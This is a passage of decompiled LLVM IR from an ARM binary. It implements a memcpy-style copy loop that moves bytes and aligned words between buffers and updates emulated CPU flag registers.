  %v6_16c78 = icmp slt i32 %v1_16c78, 0
  store i1 %v6_16c78, i1* %cpsr_n.global-to-local, align 1
  %v7_16c78 = icmp eq i32 %v1_16c78, 0
  store i1 %v7_16c78, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16c7c

dec_label_pc_16c7c:                               ; preds = %.thread115, %dec_label_pc_16c78
  %v0_16c8c.pre158 = phi i32 [ %v0_16c8c.pre, %.thread115 ], [ %v1_16c78, %dec_label_pc_16c78 ]
  %v3_16c80 = phi i32 [ %v3_16c8099116, %.thread115 ], [ %v3_16c80101, %dec_label_pc_16c78 ]
  %v1_16c84 = phi i1 [ %v1_16c88, %.thread115 ], [ %v5_16c78, %dec_label_pc_16c78 ]
  %v0_16c84 = phi i1 [ %v0_16c88, %.thread115 ], [ %v6_16c78, %dec_label_pc_16c78 ]
  %v2_16c7c = xor i1 %v1_16c84, %v0_16c84
  br i1 %v2_16c7c, label %.thread115, label %bb139

bb139:                                            ; preds = %dec_label_pc_16c7c
  %v3_16c7c = load i32, i32* %r1.global-to-local, align 4
  %v4_16c7c = inttoptr i32 %v3_16c7c to i32*
  %v5_16c7c = load i32, i32* %v4_16c7c, align 4
  store i32 %v5_16c7c, i32* @r3, align 4
  %v6_16c7c = add i32 %v3_16c7c, 4
  %v7_16c7c = inttoptr i32 %v6_16c7c to i32*
  %v8_16c7c = load i32, i32* %v7_16c7c, align 4
  store i32 %v8_16c7c, i32* @ip, align 4
  %v9_16c7c = add i32 %v3_16c7c, 8
  %v10_16c7c = inttoptr i32 %v9_16c7c to i32*
  %v11_16c7c = load i32, i32* %v10_16c7c, align 4
  store i32 %v11_16c7c, i32* %lr.global-to-local, align 4
  %v12_16c7c = add i32 %v3_16c7c, 12
  store i32 %v12_16c7c, i32* %r1.global-to-local, align 4
  %v4_16c80 = inttoptr i32 %v3_16c80 to i32*
  store i32 %v5_16c7c, i32* %v4_16c80, align 4
  %v6_16c80 = add i32 %v3_16c80, 4
  %v7_16c80 = inttoptr i32 %v6_16c80 to i32*
  %v8_16c80 = load i32, i32* @ip, align 4
  store i32 %v8_16c80, i32* %v7_16c80, align 4
  %v9_16c80 = add i32 %v3_16c80, 8
  %v10_16c80 = inttoptr i32 %v9_16c80 to i32*
  %v11_16c80 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16c80, i32* %v10_16c80, align 4
  %v12_16c80 = add i32 %v3_16c80, 12
  store i32 %v12_16c80, i32* %r0.global-to-local, align 4
  %v3_16c84 = load i32, i32* %r2.global-to-local, align 4
  %v4_16c84 = add i32 %v3_16c84, -12
  store i32 %v4_16c84, i32* %r2.global-to-local, align 4
  %v6_16c84 = sub i32 11, %v3_16c84
  %v7_16c84 = and i32 %v6_16c84, %v3_16c84
  %v8_16c84 = icmp slt i32 %v7_16c84, 0
  store i1 %v8_16c84, i1* %cpsr_v.global-to-local, align 1
  %v9_16c84 = icmp slt i32 %v4_16c84, 0
  store i1 %v9_16c84, i1* %cpsr_n.global-to-local, align 1
  %v10_16c84 = icmp eq i32 %v3_16c84, 12
  store i1 %v10_16c84, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_16c7c, %bb139
  %v0_16c8c.pre = phi i32 [ %v4_16c84, %bb139 ], [ %v0_16c8c.pre158, %dec_label_pc_16c7c ]
  %v3_16c8099116 = phi i32 [ %v12_16c80, %bb139 ], [ %v3_16c80, %dec_label_pc_16c7c ]
  %v1_16c88 = phi i1 [ %v8_16c84, %bb139 ], [ %v1_16c84, %dec_label_pc_16c7c ]
  %v0_16c88 = phi i1 [ %v9_16c84, %bb139 ], [ %v0_16c84, %dec_label_pc_16c7c ]
  %v2_16c88 = xor i1 %v1_16c88, %v0_16c88
  br i1 %v2_16c88, label %dec_label_pc_16c8c, label %dec_label_pc_16c7c

dec_label_pc_16c8c:                               ; preds = %.thread115, %dec_label_pc_16c38
  %v4_16c9c = phi i32 [ %v0_16c5094, %dec_label_pc_16c38 ], [ %v3_16c8099116, %.thread115 ]
  %v0_16c8c = phi i32 [ %v1_16c38, %dec_label_pc_16c38 ], [ %v0_16c8c.pre, %.thread115 ]
  %v1_16c8c = add i32 %v0_16c8c, 8
  store i32 %v1_16c8c, i32* %r2.global-to-local, align 4
  %v3_16c8c = sub i32 0, %v0_16c8c
  %v4_16c8c = and i32 %v1_16c8c, %v3_16c8c
  %v5_16c8c = icmp slt i32 %v4_16c8c, 0
  store i1 %v5_16c8c, i1* %cpsr_v.global-to-local, align 1
  %v6_16c8c = icmp slt i32 %v1_16c8c, 0
  store i1 %v6_16c8c, i1* %cpsr_n.global-to-local, align 1
  %v7_16c8c = icmp eq i32 %v1_16c8c, 0
  store i1 %v7_16c8c, i1* %cpsr_z.global-to-local, align 1
  %v2_16c90 = xor i1 %v6_16c8c, %v5_16c8c
  br i1 %v2_16c90, label %bb141, label %dec_label_pc_16c94

dec_label_pc_16c94:                               ; preds = %dec_label_pc_16c8c
  %v1_16c94 = add i32 %v0_16c8c, 4
  store i32 %v1_16c94, i32* %r2.global-to-local, align 4
  %v3_16c94 = sub i32 -5, %v0_16c8c
  %v4_16c94 = and i32 %v3_16c94, %v1_16c8c
  %v5_16c94 = icmp slt i32 %v4_16c94, 0
  store i1 %v5_16c94, i1* %cpsr_v.global-to-local, align 1
  %v6_16c94 = icmp slt i32 %v1_16c94, 0
  store i1 %v6_16c94, i1* %cpsr_n.global-to-local, align 1
  %v7_16c94 = icmp eq i32 %v1_16c8c, 4
  store i1 %v7_16c94, i1* %cpsr_z.global-to-local, align 1
  %v2_16c98 = xor i1 %v6_16c94, %v5_16c94
  %v3_16c98 = load i32, i32* %r1.global-to-local, align 4
  %v4_16c98 = inttoptr i32 %v3_16c98 to i32*
  %v5_16c98 = load i32, i32* %v4_16c98, align 4
  store i32 %v5_16c98, i32* @r3, align 4
  %v7_16c98 = add i32 %v3_16c98, 4
  br i1 %v2_16c98, label %.thread122, label %bb140

.thread122:                                       ; preds = %dec_label_pc_16c94
  store i32 %v7_16c98, i32* %r1.global-to-local, align 4
  %v5_16c9c = inttoptr i32 %v4_16c9c to i32*
  store i32 %v5_16c98, i32* %v5_16c9c, align 4
  %v6_16c9c = load i32, i32* %r0.global-to-local, align 4
  %v7_16c9c = add i32 %v6_16c9c, 4
  store i32 %v7_16c9c, i32* %r0.global-to-local, align 4
  %v0_16cac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb141

bb140:                                            ; preds = %dec_label_pc_16c94
  %v7_16ca0 = inttoptr i32 %v7_16c98 to i32*
  %v8_16ca0 = load i32, i32* %v7_16ca0, align 4
  store i32 %v8_16ca0, i32* @ip, align 4
  %v9_16ca0 = add i32 %v3_16c98, 8
  store i32 %v9_16ca0, i32* %r1.global-to-local, align 4
  %v4_16ca4 = inttoptr i32 %v4_16c9c to i32*
  store i32 %v5_16c98, i32* %v4_16ca4, align 4
  %v6_16ca4 = add i32 %v4_16c9c, 4
  %v7_16ca4 = inttoptr i32 %v6_16ca4 to i32*
  %v8_16ca4 = load i32, i32* @ip, align 4
  store i32 %v8_16ca4, i32* %v7_16ca4, align 4
  %v9_16ca4 = add i32 %v4_16c9c, 8
  store i32 %v9_16ca4, i32* %r0.global-to-local, align 4
  %v3_16ca8 = load i32, i32* %r2.global-to-local, align 4
  %v4_16ca8 = add i32 %v3_16ca8, -4
  store i32 %v4_16ca8, i32* %r2.global-to-local, align 4
  br label %bb141

bb141:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_16c8c, %bb, %dec_label_pc_16e5c, %dec_label_pc_16df0, %dec_label_pc_16d84, %bb140
  %v0_16cac = phi i32 [ %v0_16cac.pre, %.thread122 ], [ %v2_16cfc, %.thread128 ], [ %v1_16c8c, %dec_label_pc_16c8c ], [ %v2_16c20, %bb ], [ %v0_16cac61, %dec_label_pc_16e5c ], [ %v0_16cac60, %dec_label_pc_16df0 ], [ %v0_16cac59, %dec_label_pc_16d84 ], [ %v4_16ca8, %bb140 ]
  %v1_16cac = add i32 %v0_16cac, 4
  store i32 %v1_16cac, i32* %r2.global-to-local, align 4
  %v3_16cac = sub i32 0, %v0_16cac
  %v4_16cac = and i32 %v1_16cac, %v3_16cac
  %v5_16cac = icmp slt i32 %v4_16cac, 0
  store i1 %v5_16cac, i1* %cpsr_v.global-to-local, align 1
  %v6_16cac = icmp slt i32 %v1_16cac, 0
  store i1 %v6_16cac, i1* %cpsr_n.global-to-local, align 1
  %v7_16cac = icmp eq i32 %v1_16cac, 0
  store i1 %v7_16cac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16cac, label %bb142, label %bb141.bb143_crit_edge

bb141.bb143_crit_edge:                            ; preds = %bb141
  %v0_16cb4.pre = load i32, i32* @r3, align 4
  br label %bb143

bb142:                                            ; preds = %bb141
  %v3_16cb0 = load i8*, i8** %stack_var_-8, align 4
  %v4_16cb0 = ptrtoint i8* %v3_16cb0 to i32
  store i32 %v4_16cb0, i32* %r0.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %bb141.bb143_crit_edge, %bb142
  %v0_16cb4 = phi i32 [ %v0_16cb4.pre, %bb141.bb143_crit_edge ], [ %v8_16c1c, %bb142 ]
  call void @__pseudo_cond_branch(i1 %v7_16cac, i32 %v0_16cb4)
  %v0_16cb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_16cb8 = add i32 %v0_16cb8, -2
  %v3_16cb8 = sub i32 1, %v0_16cb8
  %v4_16cb8 = and i32 %v3_16cb8, %v0_16cb8
  %v5_16cb8 = icmp slt i32 %v4_16cb8, 0
  store i1 %v5_16cb8, i1* %cpsr_v.global-to-local, align 1
  %v6_16cb8 = icmp slt i32 %v1_16cb8, 0
  store i1 %v6_16cb8, i1* %cpsr_n.global-to-local, align 1
  %v7_16cb8 = icmp eq i32 %v0_16cb8, 2
  store i1 %v7_16cb8, i1* %cpsr_z.global-to-local, align 1
  %v0_16cbc = load i32, i32* %r1.global-to-local, align 4
  %v1_16cbc = inttoptr i32 %v0_16cbc to i8*
  %v2_16cbc = load i8, i8* %v1_16cbc, align 1
  %v5_16cbc = add i32 %v0_16cbc, 1
  store i32 %v5_16cbc, i32* %r1.global-to-local, align 4
  %v2_16cc0 = load i32, i32* %r0.global-to-local, align 4
  %v3_16cc0 = inttoptr i32 %v2_16cc0 to i8*
  store i8 %v2_16cbc, i8* %v3_16cc0, align 1
  %v4_16cc0 = load i32, i32* %r0.global-to-local, align 4
  %v5_16cc0 = add i32 %v4_16cc0, 1
  store i32 %v5_16cc0, i32* %r0.global-to-local, align 4
  %v0_16cc4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16cc4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16cc4 = xor i1 %v0_16cc4, %v1_16cc4
  br i1 %v2_16cc4, label %.thread125, label %bb144

bb144:                                            ; preds = %bb143
  %v3_16cc4 = load i32, i32* %r1.global-to-local, align 4
  %v4_16cc4 = inttoptr i32 %v3_16cc4 to i8*
  %v5_16cc4 = load i8, i8* %v4_16cc4, align 1
  %v8_16cc4 = add i32 %v3_16cc4, 1
  store i32 %v8_16cc4, i32* %r1.global-to-local, align 4
  %v6_16cc8 = inttoptr i32 %v5_16cc0 to i8*
  store i8 %v5_16cc4, i8* %v6_16cc8, align 1
  %v7_16cc8 = load i32, i32* %r0.global-to-local, align 4
  %v8_16cc8 = add i32 %v7_16cc8, 1
  store i32 %v8_16cc8, i32* %r0.global-to-local, align 4
  %v1_16ccc.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16ccc.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb143, %bb144
  %v7_16cd0 = phi i32 [ %v8_16cc8, %bb144 ], [ %v5_16cc0, %bb143 ]
  %v2_16cd0 = phi i1 [ %v2_16ccc.pre, %bb144 ], [ %v1_16cc4, %bb143 ]
  %v1_16cd0 = phi i1 [ %v1_16ccc.pre, %bb144 ], [ %v0_16cc4, %bb143 ]
  %v0_16ccc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16ccc = xor i1 %v2_16cd0, %v1_16cd0
  %v4_16ccc = or i1 %v0_16ccc, %v3_16ccc
  br i1 %v4_16ccc, label %.thread126, label %bb145

bb145:                                            ; preds = %.thread125
  %v5_16ccc = load i32, i32* %r1.global-to-local, align 4
  %v6_16ccc = inttoptr i32 %v5_16ccc to i8*
  %v7_16ccc = load i8, i8* %v6_16ccc, align 1
  %v10_16ccc = add i32 %v5_16ccc, 1
  store i32 %v10_16ccc, i32* %r1.global-to-local, align 4
  %v8_16cd0 = inttoptr i32 %v7_16cd0 to i8*
  store i8 %v7_16ccc, i8* %v8_16cd0, align 1
  %v9_16cd0 = load i32, i32* %r0.global-to-local, align 4
  %v10_16cd0 = add i32 %v9_16cd0, 1
  store i32 %v10_16cd0, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb145
  %v2_16cd4 = load i8*, i8** %stack_var_-8, align 4
  %v3_16cd4 = ptrtoint i8* %v2_16cd4 to i32
  store i32 %v3_16cd4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_16c1c)
  %v0_16cdc.pre = load i32, i32* @ip, align 4
  %v0_16ce4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_16ce8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16cdc

dec_label_pc_16cdc:                               ; preds = %dec_label_pc_16c28, %.thread126
  %v2_16ce8 = phi i32 [ %v1_16c10, %dec_label_pc_16c28 ], [ %v2_16ce8.pre, %.thread126 ]
  %v0_16ce4 = phi i32 [ %v0_16c10, %dec_label_pc_16c28 ], [ %v0_16ce4.pre, %.thread126 ]
  %v0_16cdc = phi i32 [ %v1_16c28, %dec_label_pc_16c28 ], [ %v0_16cdc.pre, %.thread126 ]
  %v1_16cdc = sub i32 4, %v0_16cdc
  store i32 %v1_16cdc, i32* @ip, align 4
  %v1_16ce0 = add i32 %v1_16cdc, -2
  %v3_16ce0 = sub i32 1, %v1_16cdc
  %v4_16ce0 = and i32 %v3_16ce0, %v1_16cdc
  %v5_16ce0 = icmp slt i32 %v4_16ce0, 0
  store i1 %v5_16ce0, i1* %cpsr_v.global-to-local, align 1
  %v6_16ce0 = icmp slt i32 %v1_16ce0, 0
  store i1 %v6_16ce0, i1* %cpsr_n.global-to-local, align 1
  %v7_16ce0 = icmp eq i32 %v1_16cdc, 2
  store i1 %v7_16ce0, i1* %cpsr_z.global-to-local, align 1
  %v1_16ce4 = inttoptr i32 %v0_16ce4 to i8*
  %v2_16ce4 = load i8, i8* %v1_16ce4, align 1
  %v3_16ce4 = zext i8 %v2_16ce4 to i32
  store i32 %v3_16ce4, i32* @r3, align 4
  %v5_16ce4 = add i32 %v0_16ce4, 1
  store i32 %v5_16ce4, i32* %r1.global-to-local, align 4
  %v3_16ce8 = inttoptr i32 %v2_16ce8 to i8*
  store i8 %v2_16ce4, i8* %v3_16ce8, align 1
  %v4_16ce8 = load i32, i32* %r0.global-to-local, align 4
  %v5_16ce8 = add i32 %v4_16ce8, 1
  store i32 %v5_16ce8, i32* %r0.global-to-local, align 4
  %v0_16cec = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16cec = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16cec = xor i1 %v0_16cec, %v1_16cec
  br i1 %v2_16cec, label %.thread127, label %bb146

bb146:                                            ; preds = %dec_label_pc_16cdc
  %v3_16cec = load i32, i32* %r1.global-to-local, align 4
  %v4_16cec = inttoptr i32 %v3_16cec to i8*
  %v5_16cec = load i8, i8* %v4_16cec, align 1
  %v6_16cec = zext i8 %v5_16cec to i32
  store i32 %v6_16cec, i32* @r3, align 4
  %v8_16cec = add i32 %v3_16cec, 1
  store i32 %v8_16cec, i32* %r1.global-to-local, align 4
  %v6_16cf0 = inttoptr i32 %v5_16ce8 to i8*
  store i8 %v5_16cec, i8* %v6_16cf0, align 1
  %v7_16cf0 = load i32, i32* %r0.global-to-local, align 4
  %v8_16cf0 = add i32 %v7_16cf0, 1
  store i32 %v8_16cf0, i32* %r0.global-to-local, align 4
  %v1_16cf4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16cf4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_16cdc, %bb146
  %v7_16cf8 = phi i32 [ %v8_16cf0, %bb146 ], [ %v5_16ce8, %dec_label_pc_16cdc ]
  %v2_16cf8 = phi i1 [ %v2_16cf4.pre, %bb146 ], [ %v1_16cec, %dec_label_pc_16cdc ]
  %v1_16cf8 = phi i1 [ %v1_16cf4.pre, %bb146 ], [ %v0_16cec, %dec_label_pc_16cdc ]
  %v0_16cf4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16cf4 = xor i1 %v2_16cf8, %v1_16cf8
  %v4_16cf4 = or i1 %v0_16cf4, %v3_16cf4
  br i1 %v4_16cf4, label %.thread128, label %bb147

bb147:                                            ; preds = %.thread127
  %v5_16cf4 = load i32, i32* %r1.global-to-local, align 4
  %v6_16cf4 = inttoptr i32 %v5_16cf4 to i8*
  %v7_16cf4 = load i8, i8* %v6_16cf4, align 1
  %v8_16cf4 = zext i8 %v7_16cf4 to i32
  store i32 %v8_16cf4, i32* @r3, align 4
  %v10_16cf4 = add i32 %v5_16cf4, 1
  store i32 %v10_16cf4, i32* %r1.global-to-local, align 4
  %v8_16cf8 = inttoptr i32 %v7_16cf8 to i8*
  store i8 %v7_16cf4, i8* %v8_16cf8, align 1
  %v9_16cf8 = load i32, i32* %r0.global-to-local, align 4
  %v10_16cf8 = add i32 %v9_16cf8, 1
  store i32 %v10_16cf8, i32* %r0.global-to-local, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb147
  %v0_16e2c77 = phi i32 [ %v10_16cf8, %bb147 ], [ %v7_16cf8, %.thread127 ]
  %v0_16cfc = load i32, i32* %r2.global-to-local, align 4
  %v1_16cfc = load i32, i32* @ip, align 4
  %v2_16cfc = sub i32 %v0_16cfc, %v1_16cfc
  store i32 %v2_16cfc, i32* %r2.global-to-local, align 4
  %v4_16cfc = xor i32 %v1_16cfc, %v0_16cfc
  %v5_16cfc = xor i32 %v2_16cfc, %v0_16cfc
  %v6_16cfc = and i32 %v5_16cfc, %v4_16cfc
  %v7_16cfc = icmp slt i32 %v6_16cfc, 0
  store i1 %v7_16cfc, i1* %cpsr_v.global-to-local, align 1
  %v8_16cfc = icmp slt i32 %v2_16cfc, 0
  store i1 %v8_16cfc, i1* %cpsr_n.global-to-local, align 1
  %v9_16cfc = icmp eq i32 %v0_16cfc, %v1_16cfc
  store i1 %v9_16cfc, i1* %cpsr_z.global-to-local, align 1
  %v2_16d00 = xor i1 %v8_16cfc, %v7_16cfc
  br i1 %v2_16d00, label %bb141, label %dec_label_pc_16d04

dec_label_pc_16d04:                               ; preds = %.thread128
  %v0_16d04 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d04 = urem i32 %v0_16d04, 4
  store i32 %v1_16d04, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16d04 = icmp eq i32 %v1_16d04, 0
  store i1 %v2_16d04, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_16d04 to i2
  br i1 %v2_16d04, label %dec_label_pc_16c38, label %dec_label_pc_16d0c

dec_label_pc_16d0c:                               ; preds = %dec_label_pc_16c30, %dec_label_pc_16d04
  %v0_16e2c76 = phi i32 [ %v1_16c10, %dec_label_pc_16c30 ], [ %v0_16e2c77, %dec_label_pc_16d04 ]
  %v0_16d94 = phi i32 [ %v2_16c20, %dec_label_pc_16c30 ], [ %v2_16cfc, %dec_label_pc_16d04 ]
  %v0_16d14.off0 = phi i2 [ %extract.t, %dec_label_pc_16c30 ], [ %extract.t131, %dec_label_pc_16d04 ]
  %v0_16d0c = phi i32 [ %v0_16c10, %dec_label_pc_16c30 ], [ %v0_16d04, %dec_label_pc_16d04 ]
  %v1_16d0c = and i32 %v0_16d0c, -4
  store i32 %v1_16d0c, i32* %r1.global-to-local, align 4
  %v1_16d10 = inttoptr i32 %v1_16d0c to i32*
  %v2_16d10 = load i32, i32* %v1_16d10, align 4
  store i32 %v2_16d10, i32* %lr.global-to-local, align 4
  %v4_16d10 = add i32 %v1_16d0c, 4
  store i32 %v4_16d10, i32* %r1.global-to-local, align 4
  %v1_16d8c = add i32 %v0_16d94, -12
  %v3_16d8c = sub i32 11, %v0_16d94
  %v4_16d8c = and i32 %v3_16d8c, %v0_16d94
  %v5_16d8c = icmp slt i32 %v4_16d8c, 0
  store i1 %v5_16d8c, i1* %cpsr_v.global-to-local, align 1
  %v6_16d8c = icmp slt i32 %v1_16d8c, 0
  store i1 %v6_16d8c, i1* %cpsr_n.global-to-local, align 1
  %v7_16d8c = icmp eq i32 %v0_16d94, 12
  store i1 %v7_16d8c, i1* %cpsr_z.global-to-local, align 1
  %v2_16d90 = xor i1 %v6_16d8c, %v5_16d8c
  switch i2 %v0_16d14.off0, label %dec_label_pc_16d20 [
    i2 -1, label %dec_label_pc_16df8
    i2 -2, label %dec_label_pc_16d8c
  ]

dec_label_pc_16d20:                               ; preds = %dec_label_pc_16d0c
  br i1 %v2_16d90, label %dec_label_pc_16d6c, label %dec_label_pc_16d28

dec_label_pc_16d28:                               ; preds = %dec_label_pc_16d20
  store i32 %v1_16d8c, i32* %r2.global-to-local, align 4
  %v3_16d2c = load i32, i32* @r4, align 4
  store i32 %v3_16d2c, i32* %stack_var_-16, align 4
  %v6_16d2c = load i32, i32* @r5, align 4
  store i32 %v6_16d2c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16d30

dec_label_pc_16d30:                               ; preds = %dec_label_pc_16d30.dec_label_pc_16d30_crit_edge, %dec_label_pc_16d28
  %v0_16d54 = phi i32 [ %v12_16d54, %dec_label_pc_16d30.dec_label_pc_16d30_crit_edge ], [ %v0_16e2c76, %dec_label_pc_16d28 ]
  %v0_16d34 = phi i32 [ %v0_16d34.pre, %dec_label_pc_16d30.dec_label_pc_16d30_crit_edge ], [ %v4_16d10, %dec_label_pc_16d28 ]
  %v0_16d30 = phi i32 [ %v0_16d30.pre, %dec_label_pc_16d30.dec_label_pc_16d30_crit_edge ], [ %v2_16d10, %dec_label_pc_16d28 ]
  %v3_16d30 = udiv i32 %v0_16d30, 256
  %v1_16d34 = inttoptr i32 %v0_16d34 to i32*
  %v2_16d34 = load i32, i32* %v1_16d34, align 4
  store i32 %v2_16d34, i32* %r4.global-to-local, align 4
  %v3_16d34 = add i32 %v0_16d34, 4
  %v4_16d34 = inttoptr i32 %v3_16d34 to i32*
  %v5_16d34 = load i32, i32* %v4_16d34, align 4
  store i32 %v5_16d34, i32* %r5.global-to-local, align 4
  %v6_16d34 = add i32 %v0_16d34, 8
  %v7_16d34 = inttoptr i32 %v6_16d34 to i32*
  %v8_16d34 = load i32, i32* %v7_16d34, align 4
  store i32 %v8_16d34, i32* %ip.global-to-local, align 4
  %v9_16d34 = add i32 %v0_16d34, 12
  %v10_16d34 = inttoptr i32 %v9_16d34 to i32*
  %v11_16d34 = load i32, i32* %v10_16d34, align 4
  store i32 %v11_16d34, i32* %lr.global-to-local, align 4
  %v12_16d34 = add i32 %v0_16d34, 16
  store i32 %v12_16d34, i32* %r1.global-to-local, align 4
  %v4_16d38 = mul i32 %v2_16d34, 16777216
  %v5_16d38 = or i32 %v4_16d38, %v3_16d30
  store i32 %v5_16d38, i32* @r3, align 4
  %v3_16d3c = udiv i32 %v2_16d34, 256
  %v4_16d40 = mul i32 %v5_16d34, 16777216
  %v5_16d40 = or i32 %v4_16d40, %v3_16d3c
  store i32 %v5_16d40, i32* %r4.global-to-local, align 4
  %v3_16d44 = udiv i32 %v5_16d34, 256
  %v4_16d48 = mul i32 %v8_16d34, 16777216
  %v5_16d48 = or i32 %v4_16d48, %v3_16d44
  store i32 %v5_16d48, i32* %r5.global-to-local, align 4
  %v3_16d4c = udiv i32 %v8_16d34, 256
  %v4_16d50 = mul i32 %v11_16d34, 16777216
  %v5_16d50 = or i32 %v4_16d50, %v3_16d4c
  store i32 %v5_16d50, i32* @ip, align 4
  %v1_16d54 = inttoptr i32 %v0_16d54 to i32*
  store i32 %v5_16d38, i32* %v1_16d54, align 4
  %v3_16d54 = add i32 %v0_16d54, 4
  %v4_16d54 = inttoptr i32 %v3_16d54 to i32*
  %v5_16d54 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16d54, i32* %v4_16d54, align 4
  %v6_16d54 = add i32 %v0_16d54, 8
  %v7_16d54 = inttoptr i32 %v6_16d54 to i32*
  %v8_16d54 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16d54, i32* %v7_16d54, align 4
  %v9_16d54 = add i32 %v0_16d54, 12
  %v10_16d54 = inttoptr i32 %v9_16d54 to i32*
  %v11_16d54 = load i32, i32* @ip, align 4
  store i32 %v11_16d54, i32* %v10_16d54, align 4
  %v12_16d54 = add i32 %v0_16d54, 16
  store i32 %v12_16d54, i32* %r0.global-to-local, align 4
  %v0_16d58 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d58 = add i32 %v0_16d58, -16
  store i32 %v1_16d58, i32* %r2.global-to-local, align 4
  %v3_16d58 = sub i32 15, %v0_16d58
  %v4_16d58 = and i32 %v3_16d58, %v0_16d58
  %v5_16d58 = icmp slt i32 %v4_16d58, 0
  %v6_16d58 = icmp slt i32 %v1_16d58, 0
  %v2_16d5c = xor i1 %v6_16d58, %v5_16d58
  br i1 %v2_16d5c, label %dec_label_pc_16d60, label %dec_label_pc_16d30.dec_label_pc_16d30_crit_edge

dec_label_pc_16d30.dec_label_pc_16d30_crit_edge:  ; preds = %dec_label_pc_16d30
  %v0_16d30.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16d34.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16d30

dec_label_pc_16d60:                               ; preds = %dec_label_pc_16d30
  %v2_16d60 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16d60, i32* @r4, align 4
  %v5_16d60 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16d60, i32* @r5, align 4
  %v1_16d64 = add i32 %v0_16d58, -4
  store i32 %v1_16d64, i32* %r2.global-to-local, align 4
  %v3_16d64 = add i32 %v0_16d58, 2147483632
  %v4_16d64 = and i32 %v1_16d64, %v3_16d64
  %v5_16d64 = icmp slt i32 %v4_16d64, 0
  store i1 %v5_16d64, i1* %cpsr_v.global-to-local, align 1
  %v6_16d64 = icmp slt i32 %v1_16d64, 0
  store i1 %v6_16d64, i1* %cpsr_n.global-to-local, align 1
  %v7_16d64 = icmp eq i32 %v1_16d64, 0
  store i1 %v7_16d64, i1* %cpsr_z.global-to-local, align 1
  %v2_16d68 = xor i1 %v6_16d64, %v5_16d64
  br i1 %v2_16d68, label %dec_label_pc_16d84, label %dec_label_pc_16d6c

dec_label_pc_16d6c:                               ; preds = %dec_label_pc_16d60, %dec_label_pc_16d20, %dec_label_pc_16d6c
  %v1_16d78 = phi i32 [ %v4_16d78, %dec_label_pc_16d6c ], [ %v12_16d54, %dec_label_pc_16d60 ], [ %v0_16e2c76, %dec_label_pc_16d20 ]
  %v0_16d6c = load i32, i32* %lr.global-to-local, align 4
  %v3_16d6c = udiv i32 %v0_16d6c, 256
  store i32 %v3_16d6c, i32* %ip.global-to-local, align 4
  %v0_16d70 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d70 = inttoptr i32 %v0_16d70 to i32*
  %v2_16d70 = load i32, i32* %v1_16d70, align 4
  store i32 %v2_16d70, i32* %lr.global-to-local, align 4
  %v4_16d70 = add i32 %v0_16d70, 4
  store i32 %v4_16d70, i32* %r1.global-to-local, align 4
  %v4_16d74 = mul i32 %v2_16d70, 16777216
  %v5_16d74 = or i32 %v4_16d74, %v3_16d6c
  store i32 %v5_16d74, i32* @ip, align 4
  %v2_16d78 = inttoptr i32 %v1_16d78 to i32*
  store i32 %v5_16d74, i32* %v2_16d78, align 4
  %v3_16d78 = load i32, i32* %r0.global-to-local, align 4
  %v4_16d78 = add i32 %v3_16d78, 4
  store i32 %v4_16d78, i32* %r0.global-to-local, align 4
  %v0_16d7c = load i32, i32* %r2.global-to-local, align 4
  %v1_16d7c = add i32 %v0_16d7c, -4
  store i32 %v1_16d7c, i32* %r2.global-to-local, align 4
  %v3_16d7c = sub i32 3, %v0_16d7c
  %v4_16d7c = and i32 %v3_16d7c, %v0_16d7c
  %v5_16d7c = icmp slt i32 %v4_16d7c, 0
  %v6_16d7c = icmp slt i32 %v1_16d7c, 0
  %v2_16d80 = xor i1 %v6_16d7c, %v5_16d7c
  br i1 %v2_16d80, label %dec_label_pc_16d84.loopexit, label %dec_label_pc_16d6c

dec_label_pc_16d84.loopexit:                      ; preds = %dec_label_pc_16d6c
  %v7_16d7c = icmp eq i32 %v0_16d7c, 4
  store i1 %v5_16d7c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16d7c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16d7c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16d84

dec_label_pc_16d84:                               ; preds = %dec_label_pc_16d84.loopexit, %dec_label_pc_16d60
  %v0_16cac59 = phi i32 [ %v1_16d7c, %dec_label_pc_16d84.loopexit ], [ %v1_16d64, %dec_label_pc_16d60 ]
  %v0_16d84 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d84 = add i32 %v0_16d84, -3
  store i32 %v1_16d84, i32* %r1.global-to-local, align 4
  br label %bb141

